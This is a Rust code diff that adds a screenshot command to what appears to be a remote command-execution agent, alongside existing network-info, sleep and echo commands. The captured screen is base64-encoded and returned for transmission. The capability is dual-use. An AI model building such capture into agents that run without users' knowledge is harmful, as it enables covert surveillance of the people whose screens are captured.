@@ -49,6 +49,9 @@ pub enum CommandType {
 
     #[serde(rename = "echo")]
     Echo { message: String },
+
+    #[serde(rename = "screenshot")]
+    Screenshot,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -88,6 +91,7 @@ impl Executor {
             CommandType::NetworkInfo => Self::network_info().await,
             CommandType::Sleep { seconds } => Self::sleep_command(*seconds).await,
             CommandType::Echo { message } => Self::echo(message).await,
+            CommandType::Screenshot => Self::screenshot().await,
         };
 
         result.execution_time_ms = start.elapsed().as_millis();
@@ -366,6 +370,38 @@ impl Executor {
             output: message.to_string(),
             error: None,
             execution_time_ms: 0,
+        }
+    }
+
+    async fn screenshot() -> CommandResult {
+        use crate::screenshot::ScreenCapture;
+
+        match ScreenCapture::capture().await {
+            Ok(data) => {
+                let size = data.len();
+                info!("📸 Screenshot captured: {} bytes", size);
+
+                // Base64 encode for transmission
+                let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
+
+                CommandResult {
+                    command_type: "screenshot".to_string(),
+                    status: "success".to_string(),
+                    output: format!("data:image/jpeg;base64,{}", b64),
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            }
+            Err(e) => {
+                error!("Screenshot capture failed: {}", e);
+                CommandResult {
+                    command_type: "screenshot".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some(e.to_string()),
+                    execution_time_ms: 0,
+                }
+            }
         }
     }
 }
